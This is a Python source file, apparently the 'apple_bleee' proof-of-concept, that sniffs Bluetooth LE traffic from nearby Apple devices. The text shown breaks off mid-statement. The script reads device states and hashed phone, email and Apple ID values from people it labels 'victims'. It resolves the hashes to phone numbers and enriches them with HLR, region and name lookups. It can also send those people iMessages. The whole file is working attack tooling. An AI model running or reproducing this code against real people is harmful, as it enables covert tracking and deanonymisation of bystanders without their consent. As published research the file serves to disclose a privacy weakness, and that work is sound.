#!/usr/bin/env python3
# Author: Dmitry Chastuhin
# Twitter: https://twitter.com/_chipik

# web: https://hexway.io
# Twitter: https://twitter.com/_hexway
import random
import re
import sys
import time
import json
import curses
import hashlib
import urllib3
import sqlite3
import requests
import argparse
import npyscreen
import subprocess
from os import path
from bs4 import BeautifulSoup
from prettytable import PrettyTable
from threading import Thread, Timer
import bluetooth._bluetooth as bluez
from utils.bluetooth_utils import (toggle_device, enable_le_scan, parse_le_advertising_events, disable_le_scan,
                                   raw_packet_to_str, start_le_advertising, stop_le_advertising)
from dictonary import (
    phone_states,
    airpods_states,
    devices_models,
    proximity_dev_models,
    proximity_colors,
    homekit_category,
    siri_dev,
    magic_sw_wrist,
    hotspot_net,
    ble_packets_types,
)


help_desc = '''
Apple bleee. Apple device sniffer
---chipik
'''
urllib3.disable_warnings()
parser = argparse.ArgumentParser(description=help_desc, formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('-c', '--check_hash', action='store_true', help='Get phone number by hash')
parser.add_argument('-n', '--check_phone', action='store_true', help='Get user info by phone number (TrueCaller/etc)')
parser.add_argument('-r', '--check_region', action='store_true', help='Get phone number region info')
parser.add_argument('-l', '--check_hlr', action='store_true',
                    help='Get phone number info by HLR request (hlrlookup.com)')
parser.add_argument('-s', '--ssid', action='store_true', help='Get SSID from requests')
parser.add_argument('-m', '--message', action='store_true', help='Send iMessage to the victim')
parser.add_argument('-a', '--airdrop', action='store_true', help='Get info from AWDL')
parser.add_argument('-d', '--active', action='store_true', help='Get devices names (gatttool)')
parser.add_argument('-v', '--verb', help='Verbose output. Filter actions (All, Nearby, Handoff, etc)')
parser.add_argument('-t', '--ttl', type=int, default=15, help='ttl')
args = parser.parse_args()

if args.check_phone:
    # import from TrueCaller API lib (sorry, but we did some RE for that :))
    print("Sorry, but we don't provide this functionality as a part of this PoC")
    exit(1)
if args.airdrop:
    from opendrop2.cli import AirDropCli, get_devices

hash2phone_url = ''  # URL to hash2phone matcher
hash2phone_db = "hash2phone/phones.db"
hlr_key = ''  # hlrlookup.com key here
hlr_pwd = ''  # hlrlookup.com password here
hlr_api_url = 'https://www.hlrlookup.com/api/hlr/?apikey={}&password={}&msisdn='.format(hlr_key, hlr_pwd)
region_check_url = ''  # URL to region checker here
imessage_url = ''  # URL to iMessage sender (sorry, but we did some RE for that :) )
iwdev = 'wlan0'
apple_company_id = 'ff4c00'

dev_id = 1  # the bluetooth device is hci0
toggle_device(dev_id, True)

sock = 0
titles = ['Mac', 'RSSI', 'Device', 'Model', 'OS', 'Time', 'WI-FI', 'State']
dev_sig = {'02010': 'MacBook', '02011': 'iPhone'}
dev_types = ["iPad", "iPhone", "MacOS", "AirPods", "Powerbeats3", "BeatsX", "Beats Solo3"]
phones = {}
resolved_devs = []
resolved_macs = []
resolved_numbers = []
victims = []
verb_messages = []
phone_number_info = {}
hash2phone = {}
dictOfss = {}
proxies = {}
verify = False


if args.check_hash:
    if not (hash2phone_url or path.isfile(hash2phone_db)):
        print(
            "You have to specify hash2phone_url or create phones.db if you want to match hashes to phones. See howto here: https://github.com/hexway/apple_bleee/tree/master/hash2phone")
        exit(1)
if args.check_hlr:
    if not hlr_key or hlr_pwd:
        print("You have to specify hlr_key or hlr_pwd for HLR requests")
        exit(1)
if args.check_region:
    if not region_check_url:
        print("You have to specify region_check_url for region requests")
        exit(1)
if args.message:
    if not imessage_url:
        print("You have to specify iMessage_url if you want to send iMessages to the victim")
        exit(1)


class App(npyscreen.StandardApp):
    def onStart(self):
        self.addForm("MAIN", MainForm, name="Apple devices scanner")
        self.addForm("COMMAND", CommandForm, name="Command Selection")


class MyGrid(npyscreen.GridColTitles):
    def custom_print_cell(self, actual_cell, cell_display_value):
        if 'Off' in cell_display_value or '<error>' in cell_display_value or 'iOS10' in cell_display_value or 'iOS11' in cell_display_value or 'Disabled' in cell_display_value:
            actual_cell.color = 'DANGER'
        elif 'Home screen' in cell_display_value or 'On' in cell_display_value or cell_display_value[0:3] in '\n'.join(
                dev_types) or 'X' in cell_display_value or 'Calling' in cell_display_value or cell_display_value in airpods_states.values() or 'WatchOS' in cell_display_value or 'Watch' in cell_display_value or 'iOS13' in cell_display_value or 'Connecting' in cell_display_value or 'WiFi screen' in cell_display_value or 'Incoming' in cell_display_value or 'Outgoing' in cell_display_value or 'Siri' in cell_display_value or 'Idle' in cell_display_value:
            actual_cell.color = 'GOOD'
        elif 'Lock screen' in cell_display_value or 'iOS12' in cell_display_value:
            actual_cell.color = 'CONTROL'
        else:
            actual_cell.color = 'DEFAULT'


class OutputBox(npyscreen.BoxTitle):
    _contained_widget = npyscreen.MultiLineEdit


class VerbOutputBox(npyscreen.BoxTitle):
    _contained_widget = npyscreen.MultiLineEdit


class CommandForm(npyscreen.ActionPopup):

    def create(self):
        self.command_choice = self.add(npyscreen.TitleSelectOne, max_height=4, value=[0],
                                       name="Select Command",
                                       values=["Sort"])

    def on_ok(self):
        selected_command = self.command_choice.get_selected_objects()[0]

        if selected_command == "Sort":
            self.parentApp.getForm('MAIN').grid.sortby = self.parentApp.getForm('MAIN').grid.edit_cell[1]
            self.parentApp.getForm('MAIN').grid.values.sort(key=lambda x: x[self.parentApp.getForm('MAIN').grid.sortby])

        self.parentApp.switchFormPrevious()


class MainForm(npyscreen.FormBaseNew):
    def create(self):
        new_handlers = {
            "^Q": self.exit_func
        }
        self.add_handlers(new_handlers)
        y, x = self.useable_space()
        if args.airdrop:
            self.gd = self.add(MyGrid, col_titles=titles, column_width=20, max_height=y // 2)
            self.OutputBox = self.add(OutputBox, editable=False)
        elif args.verb:
            self.gd = self.add(MyGrid, col_titles=titles, column_width=20, max_height=y // 2)
            self.VerbOutputBox = self.add(VerbOutputBox, editable=False, name=logFile)
        else:
            self.gd = self.add(MyGrid, col_titles=titles, column_width=20)
        self.gd.values = []
        self.gd.add_handlers({curses.ascii.NL: self.upd_cell})

    def while_waiting(self):
        self.gd.values = print_results()
        if args.airdrop:
            self.OutputBox.value = print_wifi_devs()
            self.OutputBox.display()
        if args.verb:
            self.VerbOutputBox.value = pop_verb_messages()
            self.VerbOutputBox.display()
        if args.active:
            self.get_all_dev_names()

    def exit_func(self, _input):
        disable_le_scan(sock)
        print("Bye")
        sys.exit()

    def get_dev_name(self, mac_addr):
        global resolved_devs
        # self.get_all_dev_names()
        dev_name = ''
        kill = lambda process: process.kill()
        cmd = ['gatttool', '-t', 'random', '--char-read', '--uuid=0x2a24', '-b', mac_addr]
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        timer = Timer(3, kill, [proc])
        try:
            timer.start()
            dev_name, stderr = proc.communicate()
        finally:
            timer.cancel()
        if dev_name:
            d_n_hex = dev_name.split(b"value:")[1].replace(b" ", b"").replace(b"\n", b"")
            d_n_str = bytes.fromhex(d_n_hex.decode("utf-8")).decode('utf-8')
            return_value = devices_models.get(d_n_str, d_n_str)
        else:
            return_value = ''
        init_bluez()
        resolved_devs.append(mac_addr)
        if return_value:
            # resolved_devs.append(mac_addr)
            self.set_device_val_for_mac(mac_addr, return_value)

    def get_all_dev_names(self):
        global resolved_devs
        phone_keys = list(phones.keys())
        for phone_key in phone_keys:
            phone = phones[phone_key]
            if (phone['device'] == 'MacBook' or phone['device'] == 'iPhone') and phone_key not in resolved_devs:
                self.get_dev_name(phone_key)

    def get_mac_val_from_cell(self):
        return self.gd.values[self.gd.edit_cell[0]][0]

    def get_state_val_from_cell(self):
        return self.gd.values[self.gd.edit_cell[0]][1]

    def get_device_val_from_cell(self):
        return self.gd.values[self.gd.edit_cell[0]][2]

    def get_wifi_val_from_cell(self):
        return self.gd.values[self.gd.edit_cell[0]][3]

    def get_os_val_from_cell(self):
        return self.gd.values[self.gd.edit_cell[0]][4]

    def get_phone_val_from_cell(self):
        return self.gd.values[self.gd.edit_cell[0]][5]

    def get_time_val_from_cell(self):
        return self.gd.values[self.gd.edit_cell[0]][6]

    def set_mac_val_for_mac(self, mac, value):
        global phones
        phones[mac]['mac'] = value

    def set_state_val_for_mac(self, mac, value):
        global phones
        phones[mac]['state'] = value

    def set_device_val_for_mac(self, mac, value):
        global phones
        phones[mac]['device'] = value

    def set_time_val_for_mac(self, mac, value):
        global phones
        phones[mac]['time'] = value

    def get_cell_name(self):
        return titles[self.gd.edit_cell[1]]

    def upd_cell(self, argument):
        global resolved_devs
        cell = self.get_cell_name()
        if cell == 'Device':
            mac = self.get_mac_val_from_cell()
            thread2 = Thread(target=self.get_dev_name, args=(mac,))
            # thread2 = Thread(target=self.get_all_dev_names())
            thread2.daemon = True
            thread2.start()
        if cell == 'Phone':
            if self.get_phone_val_from_cell() == 'X':
                hashinfo = "Phone hash={}, email hash={}, AppleID hash={}, SSID hash={} ({})".format(
                    hash2phone[self.get_mac_val_from_cell()]['ph_hash'],
                    hash2phone[self.get_mac_val_from_cell()]['email_hash'],
                    hash2phone[self.get_mac_val_from_cell()]['appleID_hash'],
                    hash2phone[self.get_mac_val_from_cell()]['SSID_hash'],
                    get_dict_val(dictOfss, hash2phone[self.get_mac_val_from_cell()]['SSID_hash']))
                table = print_results2(hash2phone[self.get_mac_val_from_cell()]['phone_info'])
                rez = "{}\n\n{}".format(hashinfo, table)
                npyscreen.notify_confirm(rez, title="Phone number info", wrap=True, wide=True, editw=0)

    def on_ok(self):
        selected_row = self.gd.edit_cell[0]
        self.parentApp.getForm('COMMAND').selected_row = selected_row
        self.parentApp.switchForm('COMMAND')

    def handle_input(self, key):
        super(MainForm, self).handle_input(key)
        if key == ord('\n'):
            self.on_ok()


def clear_zombies():
    zombies = []
    cur_time = int(time.time())
    for k in list(phones):
        if cur_time - phones[k]['time'] > args.ttl:
            del phones[k]
            if resolved_macs.count(k):
                resolved_macs.remove(k)
            if resolved_devs.count(k):
                resolved_devs.remove(k)
            if victims.count(k):
                victims.remove(k)


def print_results():
    rez_str = ''
    clear_zombies()
    row = []
    for phone in phones:
        row.append(
            [
                phone,
                phones[phone]['rssi'],
                phones[phone]['device'],
                phones[phone]['phone'],
                phones[phone]['os'],
                phones[phone]['time'],
                phones[phone]['wifi'],
                phones[phone]['state'],
            ]
        )

    return row


def parse_struct(data, struct):
    result = {}
    i = 0
    for key in struct:
        if key == 999:
            result[key] = data[i:]
        else:
            result[key] = data[i:i + struct[key] * 2]
        i = i + struct[key] * 2
    return result


def parse_os_wifi_code(code, dev):
    if code == '1c':
        if dev == 'MacBook':
            return ('Mac OS', 'On')
        else:
            return ('iOS12', 'On')
    elif code == '18':
        if dev == 'MacBook':
            return ('Mac OS', 'Off')
        else:
            return ('iOS12', 'Off')
    elif code == '10':
        return ('iOS11', '<unknown>')
    elif code == '1e':
        return ('iOS13', 'On')
    elif code == '1a':
        return ('iOS13', 'Off')
    elif code == '0e':
        return ('iOS13', 'Connecting')
    elif code == '0c':
        return ('iOS12', 'On')
    elif code == '04':
        return ('iOS13', 'On')
    elif code == '00':
        return ('iOS10', '<unknown>')
    elif code == '09':
        return ('Mac OS', '<unknown>')
    elif code == '14':
        return ('Mac OS', 'On')
    elif code == '98':
        return ('WatchOS', '<unknown>')
    else:
        return ('', '')


def parse_ble_packet(data):
    parsed_data = {}
    tag_len = 2
    i = 0
    while i < len(data):
        tag = data[i:i + tag_len]
        val_len = int(data[i + tag_len:i + tag_len + 2], 16)
        value_start_position = i + tag_len + 2
        value_end_position = i + tag_len + 2 + val_len * 2
        parsed_data[tag] = data[value_start_position:value_end_position]
        i = value_end_position
    return parsed_data


def put_verb_message(msg, mac):
    if args.verb:
        action = msg[:msg.find(":")]
        if action.lower() in args.verb.lower().split(",") or "all" in args.verb.lower():
            f = open(logFile, 'a+')
            f.write(f"{mac} {msg}\n")
            f.close()
            verb_messages.append(f"{mac} {msg}")


def parse_nearby(mac, header, data, rssi):
    # 0        1        2                                 5
    # +--------+--------+--------------------------------+
    # |        |        |                                |
    # | status | wifi   |           authTag              |
    # |        |        |                                |
    # +--------+--------+--------------------------------+
    nearby = {'status': 1,
              'wifi': 1,
              'authTag': 999}
    result = parse_struct(data, nearby)
    put_verb_message("Nearby:{}".format(json.dumps(result)), mac)
    state = os_state = wifi_state = unkn = '<unknown>'
    if args.verb:
        state = os_state = wifi_state = unkn = '<unknown>({})'.format(result['status'])
    if result['status'] in phone_states.keys():
        state = phone_states[result['status']]
        if args.verb:
            state = '{}({})'.format(phone_states[result['status']], result['status'])
    dev_val = unkn
    for dev in dev_sig:
        if dev in header:
            dev_val = dev_sig[dev]
    os_state, wifi_state = parse_os_wifi_code(result['wifi'], dev_val)
    if args.verb:
        wifi_state = '{}({})'.format(wifi_state, result['wifi'])
    if os_state == 'WatchOS':
        dev_val = 'Watch'
    if mac in resolved_macs or mac in resolved_devs:
        phones[mac]['state'] = state
        phones[mac]['wifi'] = wifi_state
        phones[mac]['os'] = os_state
        phones[mac]['time'] = int(time.time())
        phones[mac]['rssi'] = rssi
        if mac not in resolved_devs:
            phones[mac]['device'] = dev_val
    else:
        phones[mac] = {'state': unkn, 'device': unkn, 'wifi': unkn, 'os': unkn, 'phone': '', 'time': int(time.time())}
        phones[mac]['device'] = dev_val
        phones[mac]['rssi'] = rssi
        resolved_macs.append(mac)


def parse_nandoff(mac, data, rssi):
    # 0       1          3       4                                   14
    # +-------+----------+-------+-----------------------------------+
    # |       |          |       |                                   |
    # | Clbrd | seq.nmbr | Auth  |     Encrypted payload             |
    # |       |          |       |                                   |
    # +-------+----------+-------+-----------------------------------+
    handoff = {'clipboard': 1,
               's_nbr': 2,
               'authTag': 1,
               'encryptedData': 10}
    result = parse_struct(data, handoff)
    put_verb_message("Handoff:{}".format(json.dumps(result)), mac)
    if mac in resolved_macs:
        phones[mac]['time'] = int(time.time())
        phones[mac]['rssi'] = rssi
    else:
        phones[mac] = {'state': 'Idle', 'device': 'AppleWatch', 'wifi': '', 'os': '', 'phone': '',
                       'time': int(time.time())}
        resolved_macs.append(mac)


def parse_watch_c(mac, data, rssi):
    # 0          2       3
    # +----------+-------+
    # |          |       |
    # |  Data    | Wrist |
    # |          |       |
    # +----------+-------+
    magic_switch = {'data': 2,
                    'wrist': 1
                    }
    result = parse_struct(data, magic_switch)
    put_verb_message("MagicSwitch:{}".format(json.dumps(result)), mac)
    if mac in resolved_macs:
        phones[mac]['state'] = 'MagicSwitch'
        phones[mac]['time'] = int(time.time())
        phones[mac]['rssi'] = rssi
    else:
        phones[mac] = {'state': 'MagicSwitch', 'device': 'AppleWatch', 'wifi': '', 'os': '', 'phone': '',
                       'time': int(time.time())}
        resolved_macs.append(mac)


def parse_wifi_set(mac, data, rssi):
    # 0                                         4
    # +-----------------------------------------+
    # |                                         |
    # |             iCloud ID                   |
    # |                                         |
    # +-----------------------------------------+
    wifi_set = {'icloudID': 4}
    result = parse_struct(data, wifi_set)
    put_verb_message("WiFi settings:{}".format(json.dumps(result)), mac)
    unkn = '<unknown>'
    if mac in resolved_macs or mac in resolved_devs:
        phones[mac]['state'] = 'WiFi screen'
        phones[mac]['rssi'] = rssi
    else:
        phones[mac] = {'state': unkn, 'device': unkn, 'wifi': unkn, 'os': unkn, 'phone': '', 'time': int(time.time())}
        resolved_macs.append(mac)


def parse_hotspot(mac, data, rssi):
    # 0       1       2           4       5       6
    # +-------+-------+-----------+-------+-------+
    # |       |       |           | Net   |  Sig  |
    # | Ver   | Flags | Bat. lvl  | type  |  str  |
    # |       |       |           |       |       |
    # +-------+-------+-----------+-------+--------

    hotspot = {'version': 1,
               'flags': 1,
               'battery': 2,
               'cell_srv': 1,
               'cell_bars': 1
               }
    result = parse_struct(data, hotspot)
    put_verb_message("Hotspot:{}".format(json.dumps(result)), mac)
    if mac in resolved_macs or mac in resolved_devs:
        phones[mac]['state'] = '{}.Bat:{}%'.format(phones[mac]['state'], int(result['battery'], 16))
        phones[mac]['rssi'] = rssi
    else:
        phones[mac] = {'state': 'MagicSwitch', 'device': 'AppleWatch', 'wifi': '', 'os': '', 'phone': '',
                       'time': int(time.time())}
        resolved_macs.append(mac)


def parse_wifi_j(mac, data, rssi):
    # 0        1       2                        5                         8                       12                     15                     18
    # +--------+-------+------------------------+-------------------------+-----------------------+----------------------+----------------------+
    # |        |       |                        |                         |                       |                      |                      |
    # | flags  | type  |     auth tag           |     sha(appleID)        |   sha(phone_nbr)      |  sha(email)          |   sha(SSID)          |
    # |        | (0x08)|                        |                         |                       |                      |                      |
    # +--------+--------------------------------+-------------------------+-----------------------+----------------------+----------------------+

    wifi_j = {'flags': 1,
              'type': 1,
              'tag': 3,
              'appleID_hash': 3,
              'phone_hash': 3,
              'email_hash': 3,
              'ssid_hash': 3}
    result = parse_struct(data, wifi_j)
    put_verb_message("WiFi join:{}".format(json.dumps(result)), mac)
    global phone_number_info
    unkn = '<unknown>'
    if mac not in victims and result["type"] == "08":
        victims.append(mac)
        if args.check_hash:
            if hash2phone_url:
                get_phone_web(result['phone_hash'])
            else:
                get_phone_db(result['phone_hash'])
            if args.check_phone:
                get_names(True)
            if args.check_hlr:
                thread3 = Thread(target=get_hlr_info, args=(mac,))
                thread3.daemon = True
                thread3.start()
            if args.check_region:
                thread4 = Thread(target=get_regions(), args=())
                thread4.daemon = True
                thread4.start()
            if args.message:
                thread4 = Thread(target=sendToTheVictims, args=(result['ssid_hash'],))
                thread4.daemon = True
                thread4.start()
        if resolved_macs.count(mac):
            phones[mac]['time'] = int(time.time())
            phones[mac]['phone'] = 'X'
            phones[mac]['rssi'] = rssi
            hash2phone[mac] = {'ph_hash': result['phone_hash'], 'email_hash': result['email_hash'],
                               'appleID_hash': result['appleID_hash'], 'SSID_hash': result['ssid_hash'],
                               'phone_info': phone_number_info}
        else:
            phones[mac] = {'state': unkn, 'device': unkn, 'wifi': unkn, 'os': unkn, 'phone': '',
                           'time': int(time.time())}
            resolved_macs.append(mac)
            phones[mac]['time'] = int(time.time())
            phones[mac]['phone'] = 'X'
            hash2phone[mac] = {'ph_hash': result['phone_hash'], 'email_hash': result['email_hash'],
                               'appleID_hash': result['appleID_hash'], 'SSID_hash': result['ssid_hash'],
                               'phone_info': phone_number_info}
    else:
        phones[mac]['time'] = int(time.time())


def parse_airpods(mac, data, rssi):
    # 0       1                3        4       5       6       7       8       9                                 25
    # +-------+----------------+--------+-------+-------+-------+-------+-------+---------------------------------+
    # |       |      Device    |        |       |       | Lid   |  Dev  |       |                                 |
    # |  0x01 |      model     |  UTP   | Bat1  | Bat2  | open  |  color|  0x00 |        encrypted payload        |
    # |       |                |        |       |       | cntr  |       |       |                                 |
    # +-------+----------------+--------+-------+-------+-------+-------+-------+---------------------------------+

    airpods = {'fix1': 1,
               'model': 2,
               'utp': 1,
               'battery1': 1,
               'battery2': 1,
               'lid_counter': 1,
               'color': 1,
               'fix2': 1,
               'encr_data': 16}
    result = parse_struct(data, airpods)
    put_verb_message("AirPods:{}".format(json.dumps(result)), mac)
    state = unkn = '<unknown>'
    bat1 = "{:08b}".format(int(result['battery1'], base=16))
    bat2 = "{:08b}".format(int(result['battery2'], base=16))
    bat_left = int(bat1[:4], 2) * 10
    bat_right = int(bat1[4:], 2) * 10
    color = '{}'.format(proximity_colors[result['color']])
    bat_level = 'L:{}% R:{}%'.format(bat_left, bat_right)
    if result['utp'] in airpods_states.keys():
        state = airpods_states[result['utp']]
    else:
        state = unkn
    if result['battery1'] == '09':
        state = 'Case:Closed'
    if mac in resolved_macs:
        phones[mac]['state'] = state
        phones[mac]['time'] = int(time.time())
        phones[mac]['rssi'] = rssi
    else:
        phones[mac] = {'state': state, 'device': proximity_dev_models[result['model']], 'wifi': '', 'os': '',
                       'phone': '',
                       'time': int(time.time())}
        resolved_macs.append(mac)


def parse_airdrop_r(mac, data, rssi):
    # 0                                         8        9                11                    13                  15                 17       18
    # +-----------------------------------------+--------+----------------+---------------------+-------------------+------------------+--------+
    # |                                         |        |                |                     |                   |                  |        |
    # |           zeros                         |st(0x01)| sha(AppleID)   | sha(phone)          |  sha(email)       |   sha(email2)    |  zero  |
    # |                                         |        |                |                     |                   |                  |        |
    # +-----------------------------------------+--------+----------------+---------------------+-------------------+------------------+--------+
    airdrop_r = {'zeros': 8,
                 'st': 1,
                 'appleID_hash': 2,
                 'phone_hash': 2,
                 'email_hash': 2,
                 'email2_hash': 2,
                 'zero': 1}
    result = parse_struct(data, airdrop_r)
    put_verb_message("AirDrop:{}".format(json.dumps(result)), mac)
    if mac in resolved_macs:
        phones[mac]['state'] = 'AirDrop'
        phones[mac]['time'] = int(time.time())
        phones[mac]['rssi'] = rssi
    else:
        phones[mac] = {'state': 'AirDrop', 'device': '', 'wifi': '', 'os': '', 'phone': '',
                       'time': int(time.time())}
        resolved_macs.append(mac)


def parse_airprint(mac, data, rssi):
    # 0       1       2       3           5                                         21       22
    # +-------+-------+-------+-----------+-----------------------------------------+---------+
    # |  Addr | Res   | Sec   |   QID or  |                                         |         |
    # |  Type | path  | Type  |   TCP port|      IPv4 or IPv6 Address               | Power   |
    # |       | type  |       |           |                                         |         |
    # +-------+-------+-------+-----------+-----------------------------------------+---------+
    airpirnt = {'addrType': 1,
                'resPathType': 1,
                'secType': 1,
                'port': 2,
                'IP': 16,
                'power': 1}
    result = parse_struct(data, airpirnt)
    put_verb_message("AirPrint:{}".format(json.dumps(result)), mac)
    if mac in resolved_macs:
        phones[mac]['state'] = 'AirPrint'
        phones[mac]['time'] = int(time.time())
        phones[mac]['rssi'] = rssi
    else:
        phones[mac] = {'state': 'AirPrint', 'device': '', 'wifi': '', 'os': '', 'phone': '',
                       'time': int(time.time())}
        resolved_macs.append(mac)


def parse_airplay(mac, data):
    # 0       1       2                6
    # +-------+------------------------+
    # |       | Config|                |
    # | Flags | seed  |     IPv4       |
    # |       |       |                |
    # +-------+-------+----------------+
    airplay = {'flags': 1,
               'configSeeds': 1,
               'ipV4': 4
               }
    result = parse_struct(data, airplay)
    put_verb_message("AirPlay:{}".format(json.dumps(result)), mac)
    if mac in resolved_macs:
        phones[mac]['state'] = 'AirPlay'
        phones[mac]['time'] = int(time.time())
    else:
        phones[mac] = {'state': 'AirPlay', 'device': '', 'wifi': '', 'os': '', 'phone': '',
                       'time': int(time.time())}
        resolved_macs.append(mac)


def parse_homekit(mac, data, rssi):
    # 0       1                7            9             11      12      13
    # +------------------------+--------------------------+-------+-------+
    # | Status|                |            |Global State | Conf  | Comp  |
    # | flag  |  Device ID     | Categoty   |  number     | nmbr  | ver   |
    # |       |                |            |             |       |       |
    # +-------+----------------+------------+-------------+-------+-------+
    homekit = {'statusFlag': 1,
               'devID': 6,
               'category': 2,
               'globalStateNumber': 2,
               'configurationNumber': 1,
               'compatibleVersion': 1
               }
    result = parse_struct(data, homekit)
    put_verb_message("Homekit:{}".format(json.dumps(result)), mac)
    if mac in resolved_macs:
        phones[mac]['state'] = 'Homekit'
        phones[mac]['time'] = int(time.time())
        phones[mac]['rssi'] = rssi
    else:
        phones[mac] = {'state': 'Homekit', 'device': '', 'wifi': '', 'os': '', 'phone': '',
                       'time': int(time.time())}
        resolved_macs.append(mac)


def parse_siri(mac, data, rssi):
    # 0            2        3        4            6        7
    # +------------+--------+--------+------------+--------+
    # |            |        |        |            | Random |
    # |   hash     | SNR    | Confid |  Dev class | byte   |
    # |            |        |        |            |        |
    # +------------+--------+--------+------------+--------+
    siri = {'hash': 2,
            'SNR': 1,
            'confidence': 1,
            'devClass': 2,
            'random': 1
            }
    result = parse_struct(data, siri)
    put_verb_message("Siri:{}".format(json.dumps(result)), mac)
    if mac in resolved_macs:
        phones[mac]['state'] = 'Siri'
        phones[mac]['time'] = int(time.time())
        phones[mac]['device'] = siri_dev[result['devClass']]
        phones[mac]['rssi'] = rssi
    else:
        phones[mac] = {'state': 'Siri', 'device': siri_dev[result['devClass']], 'wifi': '', 'os': '', 'phone': '',
                       'time': int(time.time())}
        resolved_macs.append(mac)


def read_packet(mac, data_str, rssi):
    if apple_company_id in data_str:
        header = data_str[:data_str.find(apple_company_id)]
        data = data_str[data_str.find(apple_company_id) + len(apple_company_id):]
        packet = parse_ble_packet(data)
        if ble_packets_types['nearby'] in packet.keys():
            parse_nearby(mac, header, packet[ble_packets_types['nearby']], rssi)
        if ble_packets_types['handoff'] in packet.keys():
            parse_nandoff(mac, packet[ble_packets_types['handoff']], rssi)
        if ble_packets_types['watch_c'] in packet.keys():
            parse_watch_c(mac, packet[ble_packets_types['watch_c']], rssi)
        if ble_packets_types['wifi_set'] in packet.keys():
            parse_wifi_set(mac, packet[ble_packets_types['wifi_set']], rssi)
        if ble_packets_types['hotspot'] in packet.keys():
            parse_hotspot(mac, packet[ble_packets_types['hotspot']], rssi)
        if ble_packets_types['wifi_join'] in packet.keys():
            parse_wifi_j(mac, packet[ble_packets_types['wifi_join']], rssi)
        if ble_packets_types['airpods'] in packet.keys():
            parse_airpods(mac, packet[ble_packets_types['airpods']], rssi)
        if ble_packets_types['airdrop'] in packet.keys():
            parse_airdrop_r(mac, packet[ble_packets_types['airdrop']], rssi)
        if ble_packets_types['airprint'] in packet.keys():
            parse_airprint(mac, packet[ble_packets_types['airprint']], rssi)
        if ble_packets_types['homekit'] in packet.keys():
            parse_homekit(mac, packet[ble_packets_types['homekit']], rssi)
        if ble_packets_types['siri'] in packet.keys():
            parse_siri(mac, packet[ble_packets_types['siri']], rssi)
        if ble_packets_types['airplay'] in packet.keys():
            parse_siri(mac, packet[ble_packets_types['airplay']], rssi)


def get_phone_db(hashp):
    global phone_number_info
    conn = sqlite3.connect(hash2phone_db)
    c = conn.cursor()
    c.execute('SELECT phone FROM map WHERE hash=?', (hashp,))
    phones = c.fetchall()
    if not phones:
        print("No phone number found for hash '%s'" % hashp)
    else:
        phone_number_info = {
        str(i[0]): {'phone': str(i[0]), 'name': '', 'carrier': '', 'region': '', 'status': '', 'iMessage': ''}
        for i in phones}
    conn.close()


def get_phone_web(hash):
    global phone_number_info
    r = requests.get(hash2phone_url, proxies=proxies, params={'hash': hash}, verify=verify)
    if r.status_code == 200:
        result = r.json()
        phone_number_info = {i: {'phone': '', 'name': '', 'carrier': '', 'region': '', 'status': '', 'iMessage': ''} for
                             i in result['candidates']}
        for phone in phone_number_info:
            phone_number_info[phone]['phone'] = phone
    else:
        print("Something wrong! Status: {}".format(r.status_code))


def get_hlr_info(mac):
    global phone_number_info
    r = requests.get(hlr_api_url + ','.join(phone_number_info.keys()), proxies=proxies, verify=verify)
    if r.status_code == 200:
        result = r.json()
        for info in result:
            phone_number_info[info]['status'] = '{}'.format(result[info]['error_text'])


def get_region(phone):
    global phone_number_info
    r = requests.get(region_check_url + phone, proxies=proxies, verify=verify)
    if r.status_code == 200:
        soup = BeautifulSoup(r.content, 'html.parser')
        text = str(soup.find("div", {"class": "itemprop_answer"}))
        region = re.findall(r'Region:(.*?)L', text, flags=re.DOTALL)[0].replace('<br/>', '').replace('\n', '')
        phone_number_info[phone]['region'] = region
    else:
        print("Something wrong! Status: {}".format(r.status_code))


def print_results2(data):
    x = PrettyTable()
    x.field_names = ["Phone", "Name", "Carrier", "Region", "Status", 'iMessage']
    for phone in data:
        x.add_row([data[phone]['phone'], data[phone]['name'], data[phone]['carrier'], data[phone]['region'],
                   data[phone]['status'], data[phone]['iMessage']])
    return x.get_string()


def print_wifi_devs():
    return print_results3(get_devices())


def pop_verb_messages():
    global verb_messages
    result = '\n'.join(verb_messages)
    verb_messages = []
    return result


def get_names(lat=False):
    global phone_number_info
    for phone in phone_number_info:
        (name, carrier, region) = get_number_info_TrueCaller('+{}'.format(phone), lat)
        phone_number_info[phone]['name'] = name
        phone_number_info[phone]['carrier'] = carrier
        phone_number_info[phone]['region'] = region
    init_bluez()


def get_regions():
    for phone in phone_number_info:
        get_region(phone)


def get_dict_val(dict, key):
    if key in dict:
        return dict[key]
    else:
        return ''


def le_advertise_packet_handler(mac, adv_type, data, rssi):
    data_str = raw_packet_to_str(data)
    read_packet(mac, data_str, rssi)


def init_bluez():
    global sock
    try:
        sock = bluez.hci_open_dev(dev_id)
    except:
        print("Cannot open bluetooth device %i" % dev_id)
        raise

    enable_le_scan(sock, filter_duplicates=False)


def do_sniff(prnt):
    global phones
    try:
        parse_le_advertising_events(sock,
                                    handler=le_advertise_packet_handler,
                                    debug=False)
    except KeyboardInterrupt:
        print("Stop")
        disable_le_scan(sock)


def get_hash(data, size=6):
    return hashlib.sha256(data.encode('utf-8')).hexdigest()[:size]


def get_ssids():
    global dictOfss
    proc = subprocess.Popen(['ip', 'link', 'set', iwdev, 'up'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = proc.communicate()
    kill = lambda process: process.kill()
    cmd = ['iwlist', iwdev, 'scan']
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    timer = Timer(3, kill, [proc])
    try:
        timer.start()
        ssids, stderr = proc.communicate()
    finally:
        timer.cancel()
    if ssids:
        result = re.findall('ESSID:"(.*)"\n', str(ssids, 'utf-8'))
        ss = list(set(result))
        dictOfss = {get_hash(s): s for s in ss}
    else:
        dictOfss = {}


def send_imessage(tel, text):
    # our own service to send iMessage
    data = {"token": "",
            "destination": "+{}".format(tel),
            "text": text
            }
    r = requests.post(imessage_url + '/imessage', data=json.dumps(data), proxies=proxies, verify=verify)
    if r.status_code == 200:
        result = r.json()
        phone_number_info[tel]['iMessage'] = 'X'
    elif r.status_code == 404:
        phone_number_info[tel]['iMessage'] = '-'
    else:
        print(r.content)
        print("Something wrong! Status: {}".format(r.status_code))


def sendToTheVictims(SSID_hash):
    global phone_number_info
    text = ''
    for phone in phone_number_info:
        if phone_number_info[phone]['name'] and get_dict_val(dictOfss, SSID_hash):
            text = 'Hi {}! Looks like you have tried to connect to WiFi:{}'.format(phone_number_info[phone]['name'],
